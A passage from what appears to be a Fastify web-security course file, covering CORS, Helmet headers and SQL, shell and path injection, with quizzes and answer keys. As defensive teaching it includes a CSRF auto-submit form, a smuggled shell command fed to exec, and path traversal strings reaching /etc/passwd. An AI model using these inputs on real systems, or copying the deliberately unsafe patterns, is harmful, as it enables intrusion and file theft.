    if (!origin) return cb(null, false);

    let host;
    try { host = new URL(origin).host; }
    catch { return cb(null, false); }

    const ok = host === "example.com" || host.endsWith(".example.com");
    return cb(null, ok);
  },
});
// URL parsing gives you the actual host. A regex gives you a
// string that resembles one.


// ── ⚠ 4. And the thing CORS never did ───────────────────────
const d = Fastify();
await d.register(cors, { origin: ["https://app.example.com"], credentials: true });
d.get("/", async () => ({ ok: 1 }));

const res = await d.inject({ url: "/" });      // no Origin header
// VERIFIED:  200  {"ok":1}
//
// $ curl https://api.example.com/invoices/101
//   -H "Authorization: Bearer <token>"
//
// Returns the invoice. CORS was configured strictly and had
// nothing to say, because curl is not a browser and CORS is
// a browser mechanism.
//
// So every check that actually protects your data is the
// same as it was: authentication, the permission, the
// ownership predicate, the response schema. CORS protects
// your users from other websites. It does not protect you
// from anyone.


// ── ⚠ 5. CSRF is a separate control ─────────────────────────
// A strict CORS allowlist does not stop this:
//
//   <form action="https://api.example.com/transfer" method="POST">
//     <input name="to" value="attacker">
//     <input name="amount" value="1000">
//   </form>
//   <script>document.forms[0].submit()</script>
//
// The browser sends it with the victim's cookies. CORS
// governs whether the attacker may READ the response, and
// this attack does not care about the response: the transfer
// already happened.
//
// The controls are Day 18's:
//   sameSite: "lax"    on the session cookie, which blocks
//                      cross-site form posts
//   and a CSRF token for anything sameSite cannot cover
//
// Two different mechanisms for two different attacks, which
// is why the cookie flags lesson and this one are both here.`,
      },
      keyTakeaways: [
        "CORS is browser-enforced and protects your users' other tabs, not your API.",
        "Verified: a request with no `Origin` header returned 200 with the full body against a strict allowlist. `curl` and server-to-server calls are unaffected.",
        "So \"CORS protects my API from attackers\" is backwards. It stops another site reading your API with a victim's cookies.",
        "Verified: `origin: \"*\"` with `credentials: true` emits both headers and the browser refuses them, so your server logs nothing and your frontend breaks.",
        "Verified and worse: `origin: true` reflected `https://evil.example` with `allow-credentials: true`, producing a valid credentialed response for every origin.",
        "Reflection is worse than the wildcard precisely because it works. The wildcard fails safe and loudly; reflection fails open and silently.",
        "It is common because it is the setting that makes the console error disappear.",
        "Verified: an allowlist omitted the header for a disallowed origin and echoed the allowed one.",
        "Scheme and port are part of the origin, so `http://localhost:3000` and `http://localhost:5173` are different. That is most local CORS confusion.",
        "For dynamic origins, parse with `new URL()` and compare hosts. A regex like `/example\\.com$/` matches `notexample.com`.",
        "Preflight means two round trips for non-simple requests unless you set `maxAge`.",
        "CORS does not prevent CSRF, because a CSRF attack never reads the response. Day 18's `SameSite` is that control.",
      ],
      commonMistakes: [
        "Believing CORS protects your API. Verified: a request with no `Origin` header sails through a strict allowlist.",
        "`origin: \"*\"` with `credentials: true`, which breaks the frontend while logging nothing on the server.",
        "\"Fixing\" that with `origin: true`, which reflects any origin and hands your API to every site the user visits.",
        "A regex origin check. `/example\\.com$/` matches `notexample.com`, so parse the URL instead.",
        "Forgetting that scheme and port are part of the origin, then debugging a `localhost` mismatch for an hour.",
        "Omitting `maxAge`, so every `PATCH` and every request with an `Authorization` header costs two round trips.",
        "Assuming a strict CORS policy prevents CSRF. It governs reading, and CSRF does not need to read.",
        "Adding a permissive CORS policy to make a curl test work, when curl was never subject to CORS.",
      ],
      quiz: [
        {
          question: "What was verified about a request with no `Origin` header against a strict CORS allowlist?",
          options: [
            "It was rejected",
            "It returned 200 with the full body, because CORS is browser-enforced and there was no browser",
            "It returned 403",
            "It triggered a preflight",
          ],
          correctIndex: 1,
          explanation:
            "CORS protects your users' other tabs from reading your API with their cookies. It does not protect your API.",
        },
        {
          question: "Why is `origin: true` worse than `origin: \"*\"` when credentials are enabled?",
          options: [
            "It is slower",
            "The wildcard is rejected by the browser so it fails safe; reflection returns a valid credentialed response for every origin, so it works for the attacker",
            "It only affects preflights",
            "They are equivalent",
          ],
          correctIndex: 1,
          explanation:
            "Verified that `https://evil.example` was reflected with `allow-credentials: true`. It is common because it makes the console error go away.",
        },
        {
          question: "You set `origin: \"*\"` with `credentials: true`. What do you observe?",
          options: [
            "A server error",
            "Both headers are sent, the browser refuses the response, your frontend breaks, and your server logs show nothing",
            "Requests are rejected with 403",
            "It works fine",
          ],
          correctIndex: 1,
          explanation:
            "Verified that Fastify emits both. The error lives in the browser console, which is why this is expensive to debug.",
        },
        {
          question: "Why is `origin: /example\\.com$/` unsafe?",
          options: [
            "Regexes are slow",
            "It matches `notexample.com` and `evil-example.com`. Parse the origin with `new URL()` and compare the host.",
            "Fastify does not support regexes",
            "It breaks preflight",
          ],
          correctIndex: 1,
          explanation:
            "A regex gives you a string that resembles a host. URL parsing gives you the host.",
        },
        {
          question: "Does a strict CORS policy prevent CSRF?",
          options: [
            "Yes",
            "No. A CSRF attack never reads the response, and CORS only governs reading. `SameSite` is the control.",
            "Only with credentials disabled",
            "Only for GET requests",
          ],
          correctIndex: 1,
          explanation:
            "A cross-site form post has done its damage whether or not the attacker can see the result.",
        },
      ],
    },
    {
      id: "security-headers",
      title: "Security headers and Helmet",
      durationMinutes: 11,
      explanation:
        "## Helmet\n\n<b>Helmet</b> (middleware that sets security-related HTTP response headers).\n\n```javascript\nawait app.register(helmet);\n```\n\nVerified defaults from `@fastify/helmet` 13.1.1:\n\n```text\ncontent-security-policy       default-src 'self'; base-uri 'self'; font-src 'self' https: data'; ...\nstrict-transport-security     max-age=31536000; includeSubDomains\nx-frame-options               SAMEORIGIN\nx-content-type-options        nosniff\nreferrer-policy               no-referrer\ncross-origin-opener-policy    same-origin\ncross-origin-resource-policy  same-origin\nx-xss-protection              0\n```\n\n> Two of those deserve attention immediately, and neither is what people expect.\n\n---\n\n## The default CSP will break your app\n\n<b>CSP (Content Security Policy)</b> (a browser policy declaring which sources a page may load or execute content from).\n\n> Helmet's default is `default-src 'self'`, and that is a genuinely strict policy: no CDN scripts, no Google Fonts, no external images, no inline `<script>`. Verified as the shipped default.\n>\n> So `app.register(helmet)` on an application that loads anything externally <b>breaks the page</b>, and the failure appears in the browser console rather than your logs. The usual response is to disable CSP entirely, which throws away the most valuable header on the list. The better move is to declare what you actually load.\n>\n> And know what CSP is for. It does not prevent cross-site scripting; it limits what an injected script can <b>do</b>, chiefly by making exfiltration to an attacker's domain fail. That is a mitigation, and Day 18's `HttpOnly` reasoning again: containment rather than prevention.\n\n---\n\n## HSTS is set by default, and it is sticky\n\n<b>HSTS (HTTP Strict Transport Security)</b> (an instruction telling the browser to use HTTPS for this host from now on).\n\n> Verified: Helmet sets `max-age=31536000; includeSubDomains` out of the box. That is a year, and `includeSubDomains` covers every subdomain, and a browser that has seen it <b>will refuse plain HTTP to your domain for a year</b>, with no way for you to undo it remotely.\n>\n> If any subdomain is not fully on HTTPS, you have just made it unreachable for every visitor who received the header. Start with a short `max-age`, confirm every subdomain works, and only then extend it.\n\n---\n\n## The others, briefly\n\n<b>`X-Frame-Options`</b> (whether the page may be embedded in a frame).\n\n> Helmet's default is `SAMEORIGIN`, not `DENY`. It defends against <b>clickjacking</b>, where your page is loaded invisibly over an attacker's page so a click lands on your button. CSP's `frame-ancestors` is the modern replacement and takes precedence where supported; keep both, since the cost is a header.\n\n<b>`X-Content-Type-Options: nosniff`</b> stops the browser guessing a content type, which is what turns an uploaded file into executable script.\n\n> And `x-xss-protection: 0` looks alarming and is correct. That header enabled a legacy browser filter which itself introduced vulnerabilities, so the modern advice is to switch it off explicitly. Helmet is doing the right thing.\n\n---\n\n## What headers do not do\n\n> Every header here is an <b>instruction to a browser</b>. They are worth setting, they are cheap, and they do nothing for `curl`, nothing for a server-to-server client, and nothing for an authorization bug. This is the same boundary as the CORS lesson: browser mechanisms protect your users from other websites, and none of them protects your data from a client that simply asks for it.",
      diagram: `Verified defaults, @fastify/helmet 13.1.1

    content-security-policy
      default-src 'self'; base-uri 'self'; ...
    strict-transport-security
      max-age=31536000; includeSubDomains
    x-frame-options            SAMEORIGIN
    x-content-type-options     nosniff
    referrer-policy            no-referrer
    cross-origin-opener-policy same-origin
    cross-origin-resource-policy same-origin
    x-xss-protection           0

    two of those need attention immediately, and
    neither is what people expect.


⚠⚠ The default CSP WILL break your app

    default-src 'self'   ← verified as shipped

    that is genuinely strict:
      no CDN scripts
      no Google Fonts
      no external images
      no inline <script>

    so app.register(helmet) on an app that loads
    anything externally BREAKS THE PAGE, and the
    failure appears in the BROWSER CONSOLE, not
    your logs.

    the usual response: disable CSP entirely.
      → throws away the most valuable header on
        the list

    better: declare what you actually load.

    and know what CSP IS FOR:

      it does not PREVENT XSS.
      it limits what an injected script can DO,
      chiefly by making exfiltration to an
      attacker's domain fail.

      containment, not prevention.
      Day 18's HttpOnly reasoning again.


⚠⚠ HSTS is set by default, and it is STICKY

    verified: max-age=31536000; includeSubDomains

    that is a YEAR.
    includeSubDomains covers EVERY subdomain.
    a browser that has seen it WILL REFUSE PLAIN
    HTTP to your domain for a year.

    with no way for you to undo it remotely.

    if any subdomain is not fully on HTTPS, you
    have just made it unreachable for every
    visitor who got the header.

    → start with a SHORT max-age
      confirm every subdomain
      then extend


The others, briefly

    X-Frame-Options    SAMEORIGIN by default,
                       not DENY

      defends CLICKJACKING: your page loaded
      invisibly over an attacker's, so a click
      lands on your button

      CSP frame-ancestors is the modern
      replacement and takes precedence.
      keep both. the cost is a header.

    nosniff            stops the browser GUESSING
                       a content type
      → which is what turns an uploaded file into
        executable script

    x-xss-protection: 0
      looks alarming. is CORRECT.
      that header enabled a legacy browser filter
      that introduced its own vulnerabilities, so
      the modern advice is to switch it OFF
      explicitly.


⚠ What headers do not do

    every one is an INSTRUCTION TO A BROWSER.

    worth setting. cheap. and:

      nothing for curl
      nothing for a server-to-server client
      nothing for an authorization bug

    same boundary as the CORS lesson:

      browser mechanisms protect your USERS from
      other websites

      none of them protects your DATA from a
      client that simply asks for it`,
      codeExample: {
        title: "Helmet, configured rather than accepted",
        code: `import Fastify from "fastify";
import helmet from "@fastify/helmet";

const app = Fastify();


// ── What you get by default. Verified. ──────────────────────
await app.register(helmet);
//
// content-security-policy: default-src 'self'; base-uri 'self';
//   font-src 'self' https: data:; form-action 'self';
//   frame-ancestors 'self'; img-src 'self' data:;
//   object-src 'none'; script-src 'self'; script-src-attr 'none';
//   style-src 'self' https: 'unsafe-inline'; upgrade-insecure-requests
// strict-transport-security: max-age=31536000; includeSubDomains
// x-frame-options: SAMEORIGIN
// x-content-type-options: nosniff
// referrer-policy: no-referrer
// cross-origin-opener-policy: same-origin
// cross-origin-resource-policy: same-origin
// x-xss-protection: 0
//
// For a JSON API with no browser-rendered pages, those
// defaults are fine and you can stop here.
//
// For anything that serves HTML, read on, because that CSP
// is stricter than your application.


// ── ⚠ What the default CSP blocks ───────────────────────────
// <script src="https://cdn.jsdelivr.net/..."></script>   ✗
// <link href="https://fonts.googleapis.com/...">          ✗
// <img src="https://images.example-cdn.com/x.jpg">        ✗
// <script>console.log("inline")</script>                  ✗
// fetch("https://api.stripe.com/...")                     ✗
//
// All refused, with a console message and nothing in your
// server logs. And the tempting fix:
//
//   await app.register(helmet, { contentSecurityPolicy: false });
//
// which removes the single most useful header because one
// font failed to load.


// ── ✓ Declare what you load ─────────────────────────────────
await app.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "https://fonts.googleapis.com", "'unsafe-inline'"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https://images.example-cdn.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      //           ^^^^^^^^ this is the directive that does the
      //           security work: an injected script cannot POST
      //           your users' data to the attacker's domain,
      //           because that domain is not listed
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
    // Run it in report-only first on an existing app, so you
    // learn what breaks without breaking it.
    reportOnly: process.env.CSP_REPORT_ONLY === "true",
  },

  // ── ⚠ HSTS: start short ───────────────────────────────────
  hsts: {
    maxAge: process.env.NODE_ENV === "production" ? 300 : 0,
    includeSubDomains: false,
    preload: false,
  },
  // Then, once every subdomain is confirmed on HTTPS:
  //   maxAge: 31536000, includeSubDomains: true
  //
  // The default is a year with subdomains included. A browser
  // that has received that will refuse plain HTTP to your
  // domain for a year, and you cannot take it back. If
  // legacy.example.com is HTTP-only, it is now unreachable
  // for everyone who visited your main site.

  // Stricter than the default, if nothing embeds you.
  frameguard: { action: "deny" },
});


// ── Rolling out CSP on an existing app ──────────────────────
// 1. reportOnly: true, plus a report endpoint.
app.post("/csp-report", {
  config: { rateLimit: { max: 100, timeWindow: "1 minute" } },
  bodyLimit: 16 * 1024,
}, async (request, reply) => {
  request.log.warn({ report: request.body }, "csp violation");
  return reply.code(204).send();
});
//
// 2. Run for a week. The reports tell you every origin your
//    application actually uses, including the ones nobody
//    remembered.
// 3. Add them to the directives.
// 4. Turn reportOnly off.
//
// Guessing the directive list and shipping it is how CSP gets
// disabled a week later.


// ── nosniff, with the thing it prevents ─────────────────────
// x-content-type-options: nosniff
//
// Without it, a browser may ignore your Content-Type and
// guess from the bytes. So a user uploads "avatar.jpg" that
// actually contains HTML with a script tag, you serve it from
// your own origin, the browser sniffs it as HTML, and the
// script runs as your site.
//
// Helmet sets this by default. Also serve user uploads from a
// separate origin, so even a successful sniff runs somewhere
// that holds no cookies of yours.


// ── ⚠ And the limit of all of it ────────────────────────────
// $ curl -s -D- https://api.example.com/invoices/101 \\
//     -H "Authorization: Bearer <token>"
//
// HTTP/2 200
// content-security-policy: default-src 'self'
// strict-transport-security: max-age=31536000
// x-frame-options: SAMEORIGIN
// x-content-type-options: nosniff
//
// {"id":101,"customer":"Someone Else","total":48200}
//
// Every header present and correct. The invoice arrived
// anyway, because these are instructions to a browser and
// curl is not one.
//
// Headers are cheap, worth setting, and orthogonal to whether
// your authorization works. The ownership predicate from two
// lessons ago is what would have stopped that response.`,
      },
      keyTakeaways: [
        "Verified `@fastify/helmet` 13.1.1 defaults include CSP `default-src 'self'`, HSTS for a year with subdomains, `x-frame-options: SAMEORIGIN` and `nosniff`.",
        "The default CSP blocks CDN scripts, external fonts, external images and inline scripts, so registering Helmet breaks any page that uses them.",
        "That failure appears in the browser console, not your logs, and the usual reaction is to disable CSP entirely, discarding the most valuable header.",
        "CSP does not prevent cross-site scripting. It limits what an injected script can do, chiefly by blocking exfiltration to an unlisted domain.",
        "`connect-src` is the directive doing the security work, because it is what stops stolen data leaving.",
        "Verified: Helmet sets HSTS to a year with `includeSubDomains` by default, and a browser that has seen it refuses plain HTTP for that long with no remote undo.",
        "So start with a short `max-age`, confirm every subdomain is on HTTPS, then extend.",
        "Helmet's frame default is `SAMEORIGIN`, not `DENY`, and CSP `frame-ancestors` is the modern equivalent. Keep both.",
        "`nosniff` stops the browser guessing a content type, which is what turns an uploaded file into executable script.",
        "`x-xss-protection: 0` is correct: that legacy filter introduced its own vulnerabilities, so switching it off explicitly is the modern advice.",
        "Roll CSP out with `reportOnly` and a report endpoint for a week, because guessing the directive list is how CSP ends up disabled.",
        "Every header here is an instruction to a browser. They do nothing for `curl`, nothing for server-to-server clients and nothing for an authorization bug.",
      ],
      commonMistakes: [
        "Registering Helmet on an HTML app and shipping it, then discovering in production that the CDN script is blocked.",
        "Disabling CSP because one font failed to load, which removes the header that limits the damage of an XSS bug.",
        "Guessing CSP directives instead of running `reportOnly` first, so real usage is discovered by breakage.",
        "Accepting the default HSTS on a domain with an HTTP-only subdomain, making it unreachable for a year.",
        "Adding HSTS `preload` before being certain, since removal from the preload list is slow and out of your hands.",
        "Believing CSP prevents XSS. It contains it, in the same way `HttpOnly` contains a stolen session.",
        "Removing `x-xss-protection: 0` because a zero looks like something is disabled. It is the correct value.",
        "Serving user uploads from your main origin, where a successful content-type sniff runs with your cookies.",
        "Treating a clean security-header scan as evidence the API is secure. Headers do not touch authorization.",
      ],
      quiz: [
        {
          question: "What is Helmet's default CSP, and what does it do to a typical app?",
          options: [
            "It is permissive by default",
            "`default-src 'self'`, which blocks CDN scripts, external fonts, external images and inline scripts, breaking the page with the error only in the browser console",
            "CSP is off by default",
            "It only applies to HTML responses",
          ],
          correctIndex: 1,
          explanation:
            "Verified as the shipped default. The usual reaction is to disable CSP, which discards the most valuable header on the list.",
        },
        {
          question: "What does CSP actually protect against?",
          options: [
            "It prevents XSS",
            "It limits what an injected script can do, chiefly by blocking exfiltration to a domain you did not list",
            "It sanitises input",
            "It blocks CSRF",
          ],
          correctIndex: 1,
          explanation:
            "Containment rather than prevention, which is the same reasoning as Day 18's `HttpOnly`. `connect-src` is the directive doing the work.",
        },
        {
          question: "Why is Helmet's default HSTS worth changing before you deploy?",
          options: [
            "It is too short",
            "It is a year with `includeSubDomains`, and a browser that receives it refuses plain HTTP for that long with no remote undo, so an HTTP-only subdomain becomes unreachable",
            "It conflicts with CSP",
            "It only works on HTTP/2",
          ],
          correctIndex: 1,
          explanation:
            "Verified `max-age=31536000; includeSubDomains`. Start short, confirm every subdomain, then extend.",
        },
        {
          question: "Why does `x-content-type-options: nosniff` matter for uploads?",
          options: [
            "It compresses responses",
            "Without it a browser may ignore your Content-Type and guess from the bytes, so an uploaded file containing HTML runs as script on your origin",
            "It validates file extensions",
            "It blocks large files",
          ],
          correctIndex: 1,
          explanation:
            "Also serve uploads from a separate origin, so even a successful sniff runs somewhere holding none of your cookies.",
        },
        {
          question: "You run a security-header scan and it comes back clean. What does that tell you about your API?",
          options: [
            "It is secure",
            "Very little. Headers are browser instructions and do nothing for `curl`, server-to-server clients or an authorization bug.",
            "That CORS is configured",
            "That CSP is enforced server-side",
          ],
          correctIndex: 1,
          explanation:
            "The ownership predicate from the IDOR lesson is what protects the data. Headers protect your users from other websites.",
        },
      ],
    },
    {
      id: "injection",
      title: "Injection: SQL, shell and paths",
      durationMinutes: 12,
      explanation:
        "Three injections, one shape: untrusted text becomes part of something that gets <b>interpreted</b>.\n\n---\n\n## SQL injection\n\nDay 17 covered this: never concatenate, always parameterize, and the placeholder is `$1` in PostgreSQL and `?` in SQLite. One authorization-flavoured reminder is worth adding.\n\n> Parameters carry <b>values, not identifiers</b>. So a sort column or a table name cannot be a parameter, and `ORDER BY $1` silently orders by a constant instead of erroring. Validate those against an allowlist, which Day 16's Zod enum does exactly.\n\n---\n\n## Command injection\n\n<b>Command injection</b> (untrusted input becoming part of a command that a shell interprets).\n\n```javascript\nexec(`echo ${userInput}`);\n```\n\nVerified with `userInput = \"hostname; echo INJECTED-SECOND-COMMAND\"`:\n\n```text\nexec()      →  \"hostname\\nINJECTED-SECOND-COMMAND\"\nexecFile()  →  \"hostname; echo INJECTED-SECOND-COMMAND\"\n```\n\n> The difference is that <b>`exec` runs a shell and `execFile` does not</b>. With `exec`, the `;` is punctuation the shell understands, so two commands ran. With `execFile`, the whole string is one argument and nothing was interpreted, because there is no shell present to interpret it.\n>\n> This is not escaping, it is the absence of a parser. Same reasoning as a parameterized query: the safe version does not clean the input, it puts the input somewhere that is never read as code.\n\n---\n\n## The option that undoes it\n\nVerified: `execFile(\"echo\", [input], { shell: true })` produced `\"hostname\\nINJECTED-SECOND-COMMAND\"` again.\n\n> `shell: true` reintroduces the shell, so you are back to `exec` with a longer signature. Node 24 now warns about this itself:\n>\n> ```text\n> [DEP0190] DeprecationWarning: Passing args to a child process\n> with shell option true can lead to security vulnerabilities,\n> as the arguments are not escaped, only concatenated.\n> ```\n>\n> Verified. Node telling you directly, in the runtime, that this combination is a vulnerability.\n\n---\n\n## Path traversal\n\n<b>Path traversal</b> (reading or writing files outside the directory the application meant to expose).\n\nVerified against `/var/app/uploads`:\n\n```text\ninput               path.join            path.resolve\n\"report.pdf\"        /var/app/uploads/…   /var/app/uploads/report.pdf\n\"../../etc/passwd\"  /var/etc/passwd      /var/etc/passwd\n\"/etc/passwd\"       /var/app/uploads/…   /etc/passwd\n```\n\n> Look at the last row. `join` treated the absolute path as a segment and stayed inside; `resolve` <b>discarded the base entirely</b> and returned `/etc/passwd`. So the common advice to \"resolve the path\" is only safe <b>with</b> the containment check, and resolve alone is worse than join for an absolute input.\n\n---\n\n## The containment check that does not work\n\n> This is the part that ships. The obvious implementation is:\n>\n> ```javascript\n> if (!resolved.startsWith(UPLOADS)) throw new Error(\"nope\");\n> ```\n>\n> Verified: `path.resolve(\"/var/app/uploads\", \"../uploads-evil/secret.txt\")` gives `/var/app/uploads-evil/secret.txt`, and `.startsWith(\"/var/app/uploads\")` is <b>`true`</b>. The check passes and the file is outside the directory, because the prefix matched a sibling whose name begins with the same characters.\n>\n> Two correct forms: compare against `UPLOADS + path.sep`, verified `false`; or use `path.relative(UPLOADS, resolved)` and reject anything starting with `..`, verified as the rejection.\n\nAlso decode before you check, since `..%2f..%2f` decodes to `../../` and `resolve` then escapes exactly as the plain version does. And prefer not accepting paths at all: an id that you look up gives you the filename, and there is nothing to traverse.",
      diagram: `Three injections, one shape

    untrusted text becomes part of something that
    gets INTERPRETED.


SQL: Day 17, plus one reminder

    parameters carry VALUES, NOT IDENTIFIERS.

    a sort column or a table name cannot be a
    parameter.

    ORDER BY $1 silently orders by a CONSTANT
    rather than erroring.

    → allowlist them. a Zod enum (Day 16) does
      exactly this.


Command injection, verified

    input = "hostname; echo INJECTED-SECOND-COMMAND"

    exec()
      "hostname\\nINJECTED-SECOND-COMMAND"
        ← the ; was punctuation. TWO commands ran.

    execFile()
      "hostname; echo INJECTED-SECOND-COMMAND"
        ← ONE argument. nothing interpreted.

    the difference: exec RUNS A SHELL.
    execFile does not.

    this is not escaping. it is THE ABSENCE OF A
    PARSER.

    same reasoning as a parameterized query:
      the safe version does not CLEAN the input
      it puts the input somewhere never read as
      code


⚠ The option that undoes it

    execFile("echo", [input], { shell: true })
      → "hostname\\nINJECTED-SECOND-COMMAND"

    verified. you are back to exec with a longer
    signature.

    and Node 24 warns you itself:

      [DEP0190] DeprecationWarning: Passing args
      to a child process with shell option true
      can lead to security vulnerabilities, as
      the arguments are not escaped, only
      concatenated.

    the runtime telling you, directly, that this
    is a vulnerability.


⚠ Path traversal: join and resolve DIFFER

    base = /var/app/uploads

    input              join          resolve
    "report.pdf"       …/report.pdf  …/report.pdf
    "../../etc/passwd" /var/etc/…    /var/etc/…
    "/etc/passwd"      …/etc/passwd  /etc/passwd
                       (contained)   (ESCAPED)

    look at the last row.

      join treated the absolute path as a SEGMENT
        and stayed inside

      resolve DISCARDED THE BASE and returned
        /etc/passwd

    so "resolve the path" is only safe WITH the
    containment check, and resolve ALONE is worse
    than join for an absolute input.


⚠⚠ The containment check that does not work

    the obvious implementation:

      if (!resolved.startsWith(UPLOADS)) throw

    verified:

      resolve("/var/app/uploads",
              "../uploads-evil/secret.txt")
        = /var/app/uploads-evil/secret.txt

      .startsWith("/var/app/uploads")  →  TRUE

    the check PASSES and the file is OUTSIDE,
    because the prefix matched a SIBLING whose
    name begins with the same characters.

    two correct forms:

      startsWith(UPLOADS + path.sep)
        →  false   (verified)

      !path.relative(UPLOADS, resolved)
          .startsWith("..")
        →  rejected (verified)


Two more

    DECODE FIRST.
      "..%2f..%2f" decodes to "../../" and
      resolve then escapes exactly as the plain
      version does.

    BETTER: do not accept paths at all.
      an id you look up gives you the filename,
      and there is nothing to traverse.`,
      codeExample: {
        title: "The three, with verified outputs",
        code: `import { exec, execFile } from "node:child_process";
import { promisify } from "node:util";
import path from "node:path";
import { createReadStream } from "node:fs";
import { stat } from "node:fs/promises";

const pexec = promisify(exec);
const pexecFile = promisify(execFile);


// ═══════════════════════════════════════════════════════════
// Command injection
// ═══════════════════════════════════════════════════════════
const userInput = "hostname; echo INJECTED-SECOND-COMMAND";

// ── ✗ exec runs a shell ─────────────────────────────────────
const a = await pexec(\`echo \${userInput}\`);
console.log(a.stdout.trim());
// "hostname
//  INJECTED-SECOND-COMMAND"          ← VERIFIED
//
// The ';' was punctuation the shell understood. Two commands
// ran. Substitute anything a shell interprets and the same
// thing happens: ; && || | $() backticks > <

// ── ✓ execFile does not ─────────────────────────────────────
const b = await pexecFile("echo", [userInput]);
console.log(b.stdout.trim());
// "hostname; echo INJECTED-SECOND-COMMAND"     ← VERIFIED
//
// One argument. Nothing interpreted, because no shell exists
// to interpret it. Note this is not escaping: there is simply
// no parser in the path any more.

// ── ✗✗ shell: true puts it back ─────────────────────────────
const c = await pexecFile("echo", [userInput], { shell: true });
console.log(c.stdout.trim());
// "hostname
//  INJECTED-SECOND-COMMAND"          ← VERIFIED
//
// And Node 24 says so itself:
//
//   (node:11153) [DEP0190] DeprecationWarning: Passing args
//   to a child process with shell option true can lead to
//   security vulnerabilities, as the arguments are not
//   escaped, only concatenated.
//
// If you see DEP0190 in your logs, that is a finding.


// ── ✓ And validate anyway, because argv is not everything ───
import { z } from "zod";

const hostSchema = z.string().regex(/^[a-z0-9.-]{1,253}$/i);

app.post("/diagnostics/ping", {
  preHandler: [authenticate, app.requirePermission("diagnostics.run")],
  schema: { body: z.object({ host: hostSchema }) },
  config: { rateLimit: { max: 5, timeWindow: "1 minute" } },
}, async (request) => {
  const { stdout } = await pexecFile("ping", ["-c", "3", "--", request.body.host], {
    timeout: 5_000,
    maxBuffer: 64 * 1024,
  });
  return { output: stdout };
});
//
// Four things there beyond execFile:
//   the "--" so a host starting with "-" cannot become a flag
//   a timeout, so the child cannot hang a request forever
//   a maxBuffer, so its output cannot exhaust memory
//   the permission and the rate limit, because running
//     processes on request is expensive whoever asks
//
// And honestly: prefer not shelling out. A DNS lookup with
// node:dns answers most "is this host reachable" questions
// with no child process at all.


// ═══════════════════════════════════════════════════════════
// ⚠ Path traversal
// ═══════════════════════════════════════════════════════════
const UPLOADS = "/var/app/uploads";

// ── join and resolve are not interchangeable. Verified. ─────
path.join(UPLOADS, "../../etc/passwd");     // /var/etc/passwd
path.resolve(UPLOADS, "../../etc/passwd");  // /var/etc/passwd

path.join(UPLOADS, "/etc/passwd");          // /var/app/uploads/etc/passwd
path.resolve(UPLOADS, "/etc/passwd");       // /etc/passwd      ← escaped
//
// resolve() discards the base when the second argument is
// absolute. So "just resolve it" is not the fix; resolve plus
// a containment check is.


// ── ✗✗ The containment check everyone writes first ──────────
function unsafeCheck(name) {
  const resolved = path.resolve(UPLOADS, name);
  if (!resolved.startsWith(UPLOADS)) throw new Error("outside");
  return resolved;
}

unsafeCheck("../uploads-evil/secret.txt");
// Returns /var/app/uploads-evil/secret.txt
//
// VERIFIED:
//   resolved = "/var/app/uploads-evil/secret.txt"
//   resolved.startsWith("/var/app/uploads")  ->  true
//
// The check passed. The file is in a different directory. A
// sibling whose name merely begins with the same characters
// defeats a prefix comparison, and nothing about the code
// looks wrong.


// ── ✓ Two checks that work ──────────────────────────────────
function safeWithSep(name) {
  const resolved = path.resolve(UPLOADS, name);
  if (!resolved.startsWith(UPLOADS + path.sep)) throw new Error("outside");
  return resolved;
}
// VERIFIED: "/var/app/uploads-evil/..." startsWith
//           "/var/app/uploads/"  ->  false

function safeWithRelative(name) {
  const resolved = path.resolve(UPLOADS, name);
  const rel = path.relative(UPLOADS, resolved);
  if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) {
    throw new Error("outside");
  }
  return resolved;
}
// VERIFIED: relative gives "../uploads-evil/secret.txt",
//           which starts with ".." -> rejected.
//
// The relative form reads better, and it is harder to write
// wrongly than a string comparison against a base you have
// to remember to suffix.


// ── ✓ And decode before you check ───────────────────────────
decodeURIComponent("..%2f..%2fetc/passwd");   // "../../etc/passwd"
path.resolve(UPLOADS, decodeURIComponent("..%2f..%2fetc/passwd"));
// "/var/etc/passwd"       ← VERIFIED
//
// Fastify decodes query and params for you, so this is mostly
// a problem when you hand-parse a URL or read a path out of a
// JSON body. Check the value you will actually use.


// ── ✓ Better: never accept a path ───────────────────────────
app.get("/files/:id", {
  preHandler: authenticate,
  schema: { params: z.object({ id: z.coerce.number().int().positive() }) },
}, async (request, reply) => {
  // The database gives you the filename, and the ownership
  // predicate from the IDOR lesson gives you the authorization.
  const [file] = await db.select().from(files).where(and(
    eq(files.id, request.params.id),
    eq(files.userId, request.user.id),
  ));

  if (!file) return reply.code(404).send({ error: "Not found" });

  // storageKey was generated by us with randomBytes, never
  // supplied by a client, so there is no path to traverse.
  const full = path.join(UPLOADS, file.storageKey);

  // Belt and braces, since the column could have been written
  // by an older, buggier version of this code.
  const rel = path.relative(UPLOADS, path.resolve(full));
  if (!rel || rel.startsWith("..")) {
    request.log.error({ fileId: file.id }, "stored key escapes uploads dir");
    return reply.code(500).send({ error: "Internal Server Error" });
  }

  const info = await stat(full);
  if (!info.isFile()) return reply.code(404).send({ error: "Not found" });

  reply.header("content-type", file.mimeType);
  reply.header("content-disposition",
    \`attachment; filename="\${encodeURIComponent(file.originalName)}"\`);
  reply.header("x-content-type-options", "nosniff");
  //            ^^^^^^^^^^^^^^^^^^^^^^ from the headers lesson:
  //            without it the browser may sniff an uploaded
  //            file as HTML and run it on your origin
  return reply.send(createReadStream(full));
});
//
// The strongest version of the whole lesson: there is no
// user-supplied path anywhere, so path traversal is not a bug
// you fixed, it is a bug you cannot have.`,
      },
      keyTakeaways: [
        "All three injections are the same shape: untrusted text becoming part of something that gets interpreted.",
        "SQL parameters carry values, not identifiers, so a sort column needs a Zod enum allowlist. `ORDER BY $1` orders by a constant without erroring.",
        "Verified: `exec` interpreted a `;` and ran two commands; `execFile` treated the whole string as one argument.",
        "The safe version is not escaping, it is the absence of a parser. Same reasoning as a parameterized query.",
        "Verified: `execFile(..., { shell: true })` reintroduces the shell and the injection.",
        "Node 24 emits `DEP0190` for that combination, stating it can lead to security vulnerabilities. If you see it in logs, that is a finding.",
        "Add `--`, a `timeout` and a `maxBuffer` to any child process, and prefer a library call over shelling out at all.",
